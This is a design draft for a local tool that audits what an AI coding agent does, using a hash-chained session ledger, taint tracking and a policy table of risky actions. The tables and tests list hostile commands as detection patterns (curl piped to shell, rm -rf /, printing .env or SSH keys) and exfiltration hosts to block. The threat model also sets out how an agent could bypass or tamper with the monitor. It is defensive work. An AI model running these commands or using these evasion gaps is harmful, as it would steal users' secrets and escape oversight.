# Kappaski v0.1 — Security Boundary & Rule Design

Date: 2026-05-23
Author: Redding (AI Red Team)
Scope: Security architecture for "local Agent behavior proof generator v0.1"
Status: draft — for Gogo's integration review

---

## 1. Threat Model

### 1.1 What We're Defending

Kappaski v0.1 sits as a **wrapper layer** between an AI coding agent and the local OS. The core security goal is **verifiable attestation** — not real-time blocking. We want to produce a proof artifact that answers:

> "During this session, what did the agent do, what sensitive resources did it touch, which decisions were made, and can the integrity of this record be verified?"

### 1.2 Threat Actors

| Actor | Capability | Motivation |
|-------|-----------|------------|
| **Compromised agent instruction** | Can emit any shell command / file read / MCP call through the runtime | Exfiltrate secrets, modify CI/CD, poison dependencies |
| **Rogue MCP server** | Controls tool implementations reachable by the agent | Side-channel data theft via tool outputs |
| **Post-hoc log tamperer** | Has filesystem access to the session log after the fact | Delete or rewrite events to hide malicious activity |
| **Bypasser** | Agent runs outside the kappaski wrapper entirely | No audit trail exists |

### 1.3 What v0.1 Can and Cannot Defend Against

| Threat | v0.1 Mitigation | Gap |
|--------|----------------|-----|
| Dangerous shell commands | Pattern-based detection + block/approve decision | Regex bypass (obfuscation, heredoc tricks) |
| Sensitive file reads | Path-based taint → session-level contamination | Content-based sensitivity (file contains secrets but path looks benign) |
| Network exfiltration | URL classification + tainted-session flag | Encrypted exfiltration, DNS tunneling |
| Log tampering | Hash-chain JSONL ledger | Log deletion before verification (no replication) |
| Wrapper bypass | **None** — v0.1 has no daemon or enforcement mechanism | Agent can simply not use kappaski |
| Prompt injection via SKILL.md | Static scan of instruction files | Already handled by existing `analyze_text` rules |

**Key limitation**: v0.1 is an **audit-and-attest** tool, not an enforcement tool. It records what happened and produces a verifiable ledger. It does not prevent an agent from running `rm -rf /` — but it will record the attempt and flag the session as tainted. Real enforcement requires a system-level wrapper (ptrace, eBPF, or a proxy daemon), which is out of scope for v0.1.

### 1.4 Bypass Threat Model (Daemon/Wrapper Absence)

Since v0.1 has no resident process, the bypass surface is the entire OS:

```
┌──────────────────────────────────────────────────┐
│  Kappaski CLI (voluntary)                        │
│  ┌──────────┐    ┌──────────┐    ┌────────────┐ │
│  │pre-runtime│ → │ runtime  │ → │post-runtime │ │
│  └──────────┘    └──────────┘    └────────────┘ │
└────────────┬─────────────────────────────────────┘
             │ agent voluntarily routes through kappaski
             ▼
┌──────────────────────────────────────────────────┐
│  Agent Process (untrusted)                        │
│                                                   │
│  Can also:                  ← BYPASS ZONE        │
│  • Call subprocess.run() directly                │
│  • Read files without recording                  │
│  • Make raw HTTP requests                        │
│  • Modify .kappaski/session.jsonl                │
└──────────────────────────────────────────────────┘
```

**Mitigations possible in v0.1**:
1. **Document the gap explicitly** — users must understand that trust depends on the agent routing through kappaski.
2. **Session integrity verification** — `kappaski proof verify` checks the hash chain; any tampering is detectable.
3. **Wrapper contract** — provide a reference adapters.md showing how Codex/Claude Code wrappers should pipe actions through `kappaski runtime record-event` and `kappaski runtime shell`.
4. **Environment variable marker** — set `KAPPASKI_SESSION_ID` in the agent's environment so the wrapper can detect if it's running inside a managed session.

---

## 2. Hash-Chain Ledger (Minimal Implementation)

### 2.1 Design

The ledger is a **JSONL file** where each line is a signed event. The hash chain is constructed as:

```
Line N: {"event": {...}, "hash": sha256(line_N-1.hash + "|" + json_canonical(event_N))}
Line 0: {"event": {"type": "session_start", ...}, "hash": sha256(session_id + "|" + json_canonical(event_0))}
```

The final line is a `session_close` event whose hash serves as the **ledger root hash** — the single value that attests to the integrity of the entire session.

### 2.2 Data Structures

```python
@dataclass
class LedgerEntry:
    """A single entry in the hash-chain ledger."""
    event: dict[str, Any]          # the full event payload
    hash: str                      # sha256 hex digest linking to previous entry
    sequence: int                  # monotonically increasing, 0-indexed

    # Computed on append: hash = sha256(prev_hash + "|" + canonical_json(event))

@dataclass  
class LedgerIntegrity:
    """Result of a ledger integrity check."""
    valid: bool
    total_entries: int
    first_violation: int | None    # sequence number of first mismatch, or None
    root_hash: str
    expected_root_hash: str
```

### 2.3 Canonical JSON Serialization

For deterministic hashing, we need canonical JSON. The simplest approach for v0.1:

```python
import json

def canonical_json(obj: dict[str, Any]) -> str:
    return json.dumps(obj, ensure_ascii=False, sort_keys=True, separators=(",", ":"))
```

This is sufficient for v0.1. If we later need cross-language compatibility, we can switch to [RFC 8785](https://tools.ietf.org/html/rfc8785) (JCS), but that requires an external library.

### 2.4 Implementation Notes

**Do NOT change `runtime.py`'s `append_event` semantics.** Instead, add a parallel path:

- `runtime.py` keeps `append_event()` as-is for backward compatibility with existing JSONL (no hash).
- Add `append_ledger_entry(event, ledger_path)` in a new module `ledger.py` that writes hash-chain JSONL.
- The CLI gets a new `--ledger` flag; when present, events are written to both the plain log and the hash-chain ledger.

**Seed implementation** (`src/kappaski/ledger.py`):

```python
import hashlib
import json
from pathlib import Path
from typing import Any

from .models import RuntimeEvent


def canonical_json(obj: dict[str, Any]) -> str:
    return json.dumps(obj, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def compute_hash(prev_hash: str, event_dict: dict[str, Any]) -> str:
    payload = prev_hash + "|" + canonical_json(event_dict)
    return hashlib.sha256(payload.encode("utf-8")).hexdigest()


def append_ledger_entry(
    event: RuntimeEvent,
    ledger_path: Path,
    prev_hash: str | None = None,
    sequence: int | None = None,
) -> tuple[str, int]:
    """Append a hash-chain entry to the ledger. Returns (new_hash, new_sequence)."""
    ledger_path.parent.mkdir(parents=True, exist_ok=True)

    if prev_hash is None or sequence is None:
        prev_hash, sequence = _read_last_entry(ledger_path)

    event_dict = event.to_dict()
    new_hash = compute_hash(prev_hash, event_dict)
    new_sequence = sequence + 1

    entry = {
        "event": event_dict,
        "hash": new_hash,
        "sequence": new_sequence,
    }

    with ledger_path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(entry, ensure_ascii=False, sort_keys=True) + "\n")

    return new_hash, new_sequence


def verify_ledger(ledger_path: Path) -> tuple[bool, int | None, str, str]:
    """Verify the hash chain. Returns (valid, first_violation_seq, computed_root, last_stored_hash)."""
    # Implementation: read line by line, recompute hashes, compare
    ...


def _read_last_entry(ledger_path: Path) -> tuple[str, int]:
    """Read the hash and sequence of the last entry, or return genesis values."""
    if not ledger_path.exists():
        return ("genesis", -1)
    # Read last line efficiently using file seek
    ...
```

### 2.5 Session Genesis and Closure

Every session MUST start with a `session_start` event and end with a `session_close` event:

```json
// session_start (sequence 0)
{
  "event": {
    "type": "session_start",
    "session_id": "uuid",
    "timestamp": "2026-05-23T21:00:00+00:00",
    "target": "/path/to/repo",
    "agent": "codex",
    "hostname": "...",
    "user": "..."
  },
  "hash": "sha256(genesis|canonical(...))",
  "sequence": 0
}

// session_close (sequence N)
{
  "event": {
    "type": "session_close",
    "session_id": "uuid",
    "timestamp": "...",
    "total_events": N,
    "tainted": true,
    "high_severity_decisions": 3,
    "critical_decisions": 0
  },
  "hash": "sha256(prev_hash|canonical(...))",
  "sequence": N
}
```

The `session_close.hash` is the **ledger root hash** — the verifiable fingerprint of the entire session.

---

## 3. Session-Level Taint Tracking

### 3.1 Taint Model

Taint is a **session-level boolean** that flips from `false` to `true` and **never flips back**. Once a session is tainted, all subsequent actions carry that taint — even actions that would otherwise be benign.

Taint propagation model for v0.1:

```
                    ┌──────────────────┐
                    │  Session Start    │
                    │  tainted = false  │
                    └────────┬─────────┘
                             │
              ┌──────────────┼──────────────┐
              ▼              ▼              ▼
    ┌─────────────┐  ┌─────────────┐  ┌─────────────┐
    │ Read .env   │  │ Normal file │  │ curl | bash │
    │ → TAINT     │  │ → no change │  │ → TAINT     │
    └──────┬──────┘  └─────────────┘  └──────┬──────┘
           │                                  │
           └──────────┬───────────────────────┘
                      ▼
            ┌──────────────────┐
            │ tainted = true    │
            │ ALL subsequent    │
            │ actions flagged   │
            └──────────────────┘
```

### 3.2 What Triggers Taint

| Trigger | Rule | Rationale |
|---------|------|-----------|
| Read sensitive file (`.env`, `id_rsa`, `credentials.json`, `kubeconfig`) | **always taint** | Secrets may have been exfiltrated |
| Execute high/critical shell command | **always taint** | Arbitrary code execution may have occurred |
| Network call to suspicious destination (pastebin, ngrok, webhook.site) | **always taint** | Data may have been exfiltrated |
| MCP tool call categorized write/delete/send | **taint** | Side effects may be irreversible |
| Prompt injection detected in agent input | **taint** | Agent's instruction chain may be compromised |
| File write to `.github/workflows/` or CI/CD path | **taint** | Supply chain may be poisoned |
| HTTP (non-HTTPS) network call from a tainted session | **taint** | Cleartext exfiltration possible |

### 3.3 TaintState Data Structure

```python
@dataclass
class TaintState:
    tainted: bool = False
    taint_triggers: list[TaintTrigger] = field(default_factory=list)
    tainted_at: str | None = None  # ISO timestamp of first taint

@dataclass
class TaintTrigger:
    sequence: int           # ledger sequence that triggered taint
    rule_id: str            # e.g., "path.secrets", "shell.curl_pipe_shell"
    reason: str             # human-readable: "Sensitive file read: /repo/.env"
    severity: str           # "high" | "critical"
```

### 3.4 Implementation Notes

- TaintState should be maintained **in memory** during the runtime phase and flushed to the ledger as metadata on each event after taint occurs.
- The `session_close` event records the final taint status in `tainted: true/false`.
- In `rules.py`, the `analyze_runtime_event` function should accept an optional `taint_state: TaintState` parameter and return an updated `TaintState` alongside findings.
- **Do not modify the existing `Finding` dataclass** — taint is a separate concept from findings.

---

## 4. Policy Decision Model

### 4.1 Decision Types

Current state: rules produce `Finding` objects with severity, but no actionable decision. v0.1 introduces `PolicyDecision`:

```python
@dataclass
class PolicyDecision:
    event_sequence: int         # ledger sequence this decision refers to
    rule_id: str                # which rule triggered this
    action: str                 # "allow" | "block" | "require_approval" | "flag"
    severity: str               # "info" | "low" | "medium" | "high" | "critical"
    reason: str                 # human-readable justification
    taint_trigger: bool         # does this decision trigger session taint?
    metadata: dict[str, Any]    # additional context (e.g., matched pattern, evidence)
```

### 4.2 Decision Mapping

| Rule / Trigger | Default Decision | Taint? |
|---------------|-----------------|--------|
| `shell.curl_pipe_shell` | `block` | yes |
| `shell.remote_exec` | `block` | yes |
| `shell.rm_rf` (target is `/` or `~`) | `block` | yes |
| `shell.git_push_main` | `require_approval` | no |
| `shell.sudo` | `require_approval` | yes |
| `shell.secret_print` | `require_approval` | yes |
| `path.secrets` (read) | `flag` | yes |
| `path.ssh-key` (read) | `flag` | yes |
| `path.cloud-credentials` (read) | `flag` | yes |
| `network.suspicious_destination` | `block` | yes |
| `network.cleartext_http` | `flag` | yes (if session already tainted) |
| `mcp.high_risk_tool` | `require_approval` | depends on tool |
| `content.prompt_injection` | `flag` | yes |
| `content.exfiltration` | `block` | yes |
| `skill.untrusted_source` | `require_approval` | no |

### 4.3 Decision and Finding Relationship

A `PolicyDecision` is produced **from** one or more `Finding` objects. The relationship:

```
RuntimeEvent → analyze_runtime_event() → [Finding, Finding, ...]
                                         → evaluate_policy(findings, taint_state) → PolicyDecision
```

The `Finding` captures *what was detected*. The `PolicyDecision` captures *what to do about it*. Both are stored in the ledger entry for that event.

---

## 5. Action Severity Classification

### 5.1 Complete Action Taxonomy for v0.1

Every action the agent can take through the runtime MUST be classified. Here is the complete matrix:

#### Shell Actions

| Pattern | Severity | Decision | Rule ID |
|---------|----------|----------|---------|
| `curl \| sh` / `wget \| bash` | **critical** | block | shell.curl_pipe_shell |
| `bash <(curl ...)` / remote exec | **critical** | block | shell.remote_exec |
| `rm -rf /` or `rm -rf ~` or `rm -rf .` | **high** | block | shell.rm_rf_root |
| `rm -rf *` (non-root) | **medium** | flag | shell.rm_rf |
| `git push main/master` | **high** | require_approval | shell.git_push_main |
| `git push --force` | **critical** | block | shell.git_push_force |
| `chmod -R 777` | **high** | require_approval | shell.chmod_recursive |
| `chmod -R` (non-777) | **medium** | flag | shell.chmod_recursive |
| `sudo ...` | **high** | require_approval | shell.sudo |
| `cat/grep .env / id_rsa / credentials` | **high** | require_approval | shell.secret_print |
| `docker run --privileged` | **critical** | block | shell.docker_privileged |
| `pip install` / `npm install -g` | **medium** | flag | shell.package_install |
| `eval` / `exec` with variable input | **high** | require_approval | shell.dynamic_exec |
| All other shell commands | **low** | allow | — |

#### File Actions

| Action | Severity | Decision | Rule ID |
|--------|----------|----------|---------|
| Read `.env` | **high** | flag + taint | file.read_secrets |
| Read `id_rsa` / `id_ed25519` | **critical** | flag + taint | file.read_ssh_key |
| Read `credentials.json` | **high** | flag + taint | file.read_cloud_creds |
| Read `kubeconfig` | **high** | flag + taint | file.read_cluster_creds |
| Read `.aws/credentials` | **high** | flag + taint | file.read_cloud_creds |
| Write `.env` | **critical** | block | file.write_secrets |
| Write `.github/workflows/*.yml` | **high** | require_approval + taint | file.write_ci_cd |
| Write `AGENTS.md` / `CLAUDE.md` / `SKILL.md` | **high** | require_approval | file.write_agent_config |
| Write `pyproject.toml` / `package.json` (dependency changes) | **medium** | flag | file.write_deps |
| Write `Makefile` / `Dockerfile` | **medium** | flag | file.write_build |
| Delete any file outside `.gitignore` patterns | **high** | require_approval | file.delete |
| Read any other file | **low** | allow | — |
| Write any other file | **low** | allow | — |

#### Network Actions

| Action | Severity | Decision | Rule ID |
|--------|----------|----------|---------|
| HTTP (not HTTPS) to any host | **medium** | flag | network.cleartext_http |
| HTTPS to pastebin/webhook.site/ngrok/requestbin/transfer.sh | **high** | block + taint | network.suspicious_destination |
| HTTPS to raw.githubusercontent.com (unpinned script) | **medium** | flag | network.unpinned_script |
| HTTPS to any other host | **low** | allow | — |
| DNS / ICMP / non-HTTP | **medium** | flag | network.non_http |

#### MCP Tool Actions

| Tool Pattern | Severity | Decision | Rule ID |
|-------------|----------|----------|---------|
| Tool name contains `write`/`create`/`update`/`delete`/`post`/`send` | **high** | require_approval | mcp.high_risk_tool |
| Tool name contains `query`/`exec`/`run`/`refund` | **high** | require_approval | mcp.high_risk_tool |
| Tool name contains `read`/`get`/`list`/`search` | **low** | allow | — |
| Any tool with `command` field in metadata containing `npx`/`uvx`/`docker` | **medium** | flag | mcp.unpinned_server |

#### Skill Actions

| Action | Severity | Decision | Rule ID |
|--------|----------|----------|---------|
| Skill loaded from `http://` source | **high** | require_approval | skill.untrusted_source |
| Skill loaded from `github.com` | **medium** | flag | skill.external_source |
| Skill loaded from local path | **low** | allow | — |

### 5.2 Edge Cases and Ambiguities

**Compound commands** — `curl example.com | bash` matches both `shell.curl_pipe_shell` (critical) and a network call. Resolution: apply the **highest severity** decision (block).

**Taint amplification** — on a tainted session, network calls to any destination become at least `medium` severity, and file writes to any location become at least `medium`. This reflects the reality that once secrets may have been read, any outbound channel is a potential exfiltration vector.

**Path traversal in file reads** — if the path contains `..` segments that escape the target directory, escalate to `high` regardless of the file content. Rule ID: `file.path_traversal`.

**Symlink following** — v0.1 does not resolve symlinks. A symlink to `/etc/passwd` named `config.txt` will not be detected. This is a known gap; document it and address in v0.2 with `realpath()` resolution.

---

## 6. Proof Report Structure

The proof report is the **primary output artifact** of v0.1. It is generated by `postruntime.py` (extending current `summarize_session`) and must answer these questions:

1. What happened? (event timeline)
2. What was detected? (findings + decisions)
3. Was sensitive data touched? (taint status + triggers)
4. Is the record trustworthy? (hash chain verification)

### 6.1 ProofReport Data Structure

```python
@dataclass
class ProofReport:
    # Header
    report_id: str              # uuid
    generated_at: str           # ISO timestamp
    session_id: str
    target: str
    
    # Integrity
    ledger_path: str
    root_hash: str
    integrity_verified: bool
    
    # Session metadata
    session_start: str
    session_end: str
    total_events: int
    agent: str | None
    hostname: str
    user: str
    
    # Security posture
    tainted: bool
    taint_triggers: list[TaintTrigger]
    
    # Decisions summary
    decisions: list[PolicyDecision]
    blocked_actions: int
    approved_actions: int
    flagged_actions: int
    
    # Risk posture
    highest_severity_reached: str
    sensitive_paths_touched: list[str]
    suspicious_urls_contacted: list[str]
    high_risk_tools_called: list[str]
    
    # Full event timeline (for detailed audit)
    events: list[dict[str, Any]]
```

### 6.2 Proof Verification

The `kappaski proof verify` command should:

1. Read the ledger JSONL
2. Recompute the hash chain from genesis to the last entry
3. Compare the computed root hash against the stored `session_close.hash`
4. Report: `VERIFIED` or `TAMPERED (first violation at sequence N)`
5. If verified, display the session summary

---

## 7. Critical Gaps for v0.2+

These are explicitly deferred from v0.1 but documented for planning:

| Gap | Risk | Priority for v0.2 |
|-----|------|-------------------|
| No runtime enforcement (ptrace/eBPF wrapper) | Agent can bypass kappaski entirely | **Highest** — without this, proof is voluntary |
| No content-based secret detection | `config.yaml` with `password: hunter2` won't be detected by path matching | High |
| No symlink resolution | Path-based rules can be evaded with symlinks | High |
| No output content scanning | Agent can exfiltrate data in tool output (e.g., `cat .env` piped to a file write) | Medium |
| No cross-session correlation | Each session is an island; can't detect patterns across sessions | Medium |
| No MCP tool output introspection | Can't see what data a tool returned, only that it was called | Medium |
| No network traffic capture | Can't detect data exfiltration that doesn't match URL patterns | Low (v0.3+) |
| JSONL log can be deleted | No replication or append-only storage | Low (v0.3+) |

---

## 8. Test Suggestions

These tests should be added to `tests/test_core.py` or a new `tests/test_security.py`. The goal is to validate the security properties without a full rule refactor.

### 8.1 Hash Chain Integrity

```python
def test_ledger_hash_chain_is_deterministic(tmp_path):
    """Same events in same order produce the same root hash."""
    ...

def test_ledger_tampering_is_detected(tmp_path):
    """Modifying one event in the middle breaks verification."""
    ...

def test_ledger_deleted_entry_is_detected(tmp_path):
    """Removing a line from the ledger breaks the chain."""
    ...

def test_ledger_reordered_entries_is_detected(tmp_path):
    """Swapping two lines breaks the hash chain."""
    ...
```

### 8.2 Taint Propagation

```python
def test_sensitive_file_read_taints_session():
    """Reading .env sets taint_state.tainted = True."""
    ...

def test_taint_is_irreversible():
    """Once tainted, taint_state.tainted cannot return to False."""
    ...

def test_tainted_session_escalates_network_actions():
    """On a tainted session, HTTP calls get severity >= medium."""
    ...

def test_taint_triggers_are_recorded():
    """Each taint trigger is stored with sequence, rule_id, reason."""
    ...
```

### 8.3 Dangerous Command Blocking

```python
def test_critical_commands_are_blocked():
    """curl | bash → PolicyDecision(action='block')."""
    ...

def test_rm_rf_root_is_blocked():
    """rm -rf / → block."""
    ...

def test_git_push_main_requires_approval():
    """git push origin main → require_approval, not block."""
    ...

def test_normal_commands_are_allowed():
    """ls -la → allow."""
    ...
```

### 8.4 Sensitive Path Detection

```python
def test_env_file_read_is_high_severity():
    """Reading .env → severity high, taint trigger."""
    ...

def test_ssh_key_read_is_critical():
    """Reading id_rsa → severity critical, taint trigger."""
    ...

def test_normal_file_read_is_low_severity():
    """Reading README.md → severity low, no taint."""
    ...
```

### 8.5 Proof Export

```python
def test_proof_report_contains_all_required_sections(tmp_path):
    """Exported proof has header, integrity, session, taint, decisions, events."""
    ...

def test_proof_verification_passes_on_clean_ledger(tmp_path):
    """kappaski proof verify returns VERIFIED on unmodified ledger."""
    ...

def test_proof_verification_fails_on_tampered_ledger(tmp_path):
    """kappaski proof verify returns TAMPERED with violation sequence."""
    ...
```

### 8.6 End-to-End

```python
def test_full_session_closed_loop(tmp_path):
    """
    session start → read .env (taint) → blocked curl|bash → 
    session close → proof export → verify passes
    """
    ...
```

---

## 9. Summary: v0.1 Implementation Priorities

In order of importance for the security boundary:

1. **`ledger.py`** — hash-chain JSONL append + verify (1 new module, ~80 lines)
2. **`TaintState` + `TaintTrigger` in `models.py`** — data structures (~30 lines)
3. **`PolicyDecision` in `models.py`** — data structure (~20 lines)
4. **`evaluate_policy()` in `rules.py`** — decision mapping from findings + taint (~50 lines)
5. **Extend `analyze_runtime_event()`** — accept optional `TaintState`, return updated state (~15 line change)
6. **`ProofReport` in `models.py`** — data structure (~30 lines)
7. **Extend `postruntime.py`** — generate `ProofReport` from ledger instead of plain JSONL (~60 lines)
8. **`cli.py` additions** — `session start`, `proof export`, `proof verify` commands (~40 lines)
9. **Tests** — `test_security.py` with the test cases above (~150 lines)

Total new code: ~475 lines. No new dependencies. No breaking changes to existing APIs.